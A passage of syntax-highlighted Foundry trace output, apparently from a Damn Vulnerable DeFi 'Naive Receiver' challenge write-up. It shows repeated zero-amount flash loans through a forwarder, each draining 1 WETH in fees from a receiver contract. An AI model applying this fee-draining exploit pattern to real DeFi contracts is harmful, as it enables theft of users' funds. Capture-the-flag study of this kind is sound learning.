    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
